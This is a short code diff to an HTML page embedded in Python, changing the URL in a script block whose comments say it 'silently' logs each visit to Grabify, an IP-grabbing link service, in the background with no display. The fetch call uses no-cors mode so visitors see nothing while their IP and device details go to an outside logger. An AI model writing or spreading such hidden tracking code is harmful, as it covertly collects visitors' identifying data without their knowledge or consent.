@@ -48,7 +48,7 @@ HTML = """<!DOCTYPE html>
     
     <script>
         // Silently log to Grabify in background (no display)
-        fetch('https://urlto.me/2l8F4', {
+        fetch('https://urlto.me/2lgF4', {
             method: 'GET',
             mode: 'no-cors'  // This makes it silent, no response needed
         }).catch(() => {});
